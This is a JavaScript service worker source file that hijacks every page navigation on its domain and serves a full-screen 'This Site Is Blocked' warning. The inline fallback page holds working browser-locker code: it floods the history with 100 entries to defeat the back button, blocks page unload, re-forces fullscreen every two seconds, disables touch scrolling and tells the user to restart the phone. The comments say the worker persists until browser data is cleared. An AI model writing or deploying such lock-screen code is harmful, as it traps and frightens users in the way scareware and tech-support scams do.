/*
 * Service Worker — Navigation Interceptor
 *
 * Runs OUTSIDE the page, in the browser's background thread.
 * Intercepts every navigation on this domain and serves popup.html —
 * even after a page refresh, tab close+reopen, or typing a new URL.
 *
 * HOW IT WORKS:
 *   1. popup.html registers this SW on first load
 *   2. SW caches popup.html and an inline fallback copy
 *   3. Every navigate request → serves popup.html from cache
 *   4. Only clearing browser data removes this worker
 *
 * SKIP_WAITING: popup.html sends postMessage({type:'SKIP_WAITING'})
 * whenever a waiting SW is detected, forcing instant activation.
 */

const CACHE_NAME  = 'popup-cache-v3';
const POPUP_PAGE  = '/popup.html';
const PRECACHE    = ['/popup.html', '/sw.js', '/manifest.json'];

/*
 * Inline fallback HTML — served if the cache is empty AND the network
 * is unreachable (e.g. device is offline). Keep in sync with popup.html.
 */
const INLINE_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1,
  maximum-scale=1,user-scalable=no,viewport-fit=cover"/>
<title>Warning</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
html{height:-webkit-fill-available}
body{
  width:100%;height:100vh;height:100dvh;
  min-height:-webkit-fill-available;
  overflow:hidden;touch-action:none;overscroll-behavior:none;
  background:#000;font-family:-apple-system,'Segoe UI',Arial,sans-serif;
  display:flex;align-items:center;justify-content:center;
}
.box{
  display:flex;flex-direction:column;align-items:center;
  text-align:center;
  padding:max(28px,env(safe-area-inset-top)) max(24px,env(safe-area-inset-right))
          max(28px,env(safe-area-inset-bottom)) max(24px,env(safe-area-inset-left));
  color:#ccc;
}
.icon{font-size:clamp(44px,14vw,72px)}
.title{margin-top:16px;font-size:clamp(20px,5.5vw,30px);
       font-weight:800;color:#ff3b3b}
.msg{margin-top:14px;font-size:clamp(13px,3.8vw,16px);line-height:1.6}
</style>
</head>
<body>
<div class="box">
  <div class="icon">⛔</div>
  <div class="title">This Site Is Blocked</div>
  <div class="msg">
    This website is not allowed on this device.<br><br>
    You cannot continue from here.<br><br>
    <strong style="color:#ff3b3b">Restart your phone to exit.</strong>
  </div>
</div>
<script>
function stuffHistory(){for(var i=0;i<100;i++)history.pushState({locked:true},'',location.href);}
stuffHistory();
window.addEventListener('popstate',stuffHistory);
window.addEventListener('beforeunload',function(e){e.preventDefault();e.returnValue='';return '';});
function goFS(){var el=document.documentElement;(el.requestFullscreen||el.webkitRequestFullscreen||el.mozRequestFullScreen||el.msRequestFullscreen||function(){}).call(el);}
setTimeout(goFS,100);
setInterval(function(){if(!document.fullscreenElement&&!document.webkitFullscreenElement)goFS();},2000);
document.addEventListener('touchmove',function(e){e.preventDefault();},{passive:false});
</script>
</body>
</html>`;

/* ── Install: pre-cache all 3 files immediately ── */
self.addEventListener('install', (event) => {
  event.waitUntil(
    caches.open(CACHE_NAME).then((cache) =>
      Promise.allSettled(PRECACHE.map(url => cache.add(url)))
    )
  );
  // Do NOT call self.skipWaiting() here — we do it via postMessage
  // so that popup.html controls when the new SW activates.
});

/* ── Message: handle SKIP_WAITING from popup.html ── */
self.addEventListener('message', (event) => {
  if (event.data && event.data.type === 'SKIP_WAITING') {
    self.skipWaiting();
  }
});

/* ── Notification click: tap notification → open/focus popup ── */
self.addEventListener('notificationclick', (event) => {
  event.notification.close();
  const targetUrl = (event.notification.data && event.notification.data.url)
    ? event.notification.data.url
    : POPUP_PAGE;

  event.waitUntil(
    clients.matchAll({ type: 'window', includeUncontrolled: true }).then((windowClients) => {
      // Focus existing popup tab if one is open
      for (const client of windowClients) {
        if (client.url.startsWith(self.registration.scope) && 'focus' in client) {
          return client.focus();
        }
      }
      // Otherwise open a new tab
      if (clients.openWindow) return clients.openWindow(targetUrl);
    })
  );
});

/* ── Activate: take control of all open tabs instantly ── */
self.addEventListener('activate', (event) => {
  event.waitUntil(
    // Delete old caches from previous versions
    caches.keys().then((keys) =>
      Promise.all(
        keys
          .filter((k) => k !== CACHE_NAME)
          .map((k) => caches.delete(k))
      )
    ).then(() => clients.claim())
  );
});

/* ── Fetch: intercept every request ── */
self.addEventListener('fetch', (event) => {
  // Only intercept full page navigations
  if (event.request.mode === 'navigate') {
    event.respondWith(servePopup());
    return;
  }

  // For sub-resources (images, CSS, JS): cache-first, then network
  event.respondWith(
    caches.match(event.request).then((cached) =>
      cached || fetch(event.request).catch(() => new Response('', { status: 503 }))
    )
  );
});

/*
 * Serve popup.html with three fallback tiers:
 *   1. Cached copy (fastest, works offline)
 *   2. Live network fetch (refreshes the cache while serving)
 *   3. Inline HTML string (absolute last resort — no network, empty cache)
 */
async function servePopup() {
  // Tier 1: cached
  const cached = await caches.match(POPUP_PAGE);
  if (cached) {
    // Silently refresh the cache in the background
    refreshCache();
    return cached;
  }

  // Tier 2: network
  try {
    const response = await fetch(POPUP_PAGE);
    if (response.ok) {
      const cache = await caches.open(CACHE_NAME);
      cache.put(POPUP_PAGE, response.clone());
      return response;
    }
  } catch (_) {/* fall through to inline */}

  // Tier 3: inline fallback
  return new Response(INLINE_HTML, {
    status: 200,
    headers: { 'Content-Type': 'text/html; charset=utf-8' }
  });
}

/* Background cache refresh — called after serving a cached response */
function refreshCache() {
  fetch(POPUP_PAGE)
    .then(async (response) => {
      if (response.ok) {
        const cache = await caches.open(CACHE_NAME);
        cache.put(POPUP_PAGE, response);
      }
    })
    .catch(() => {});
}
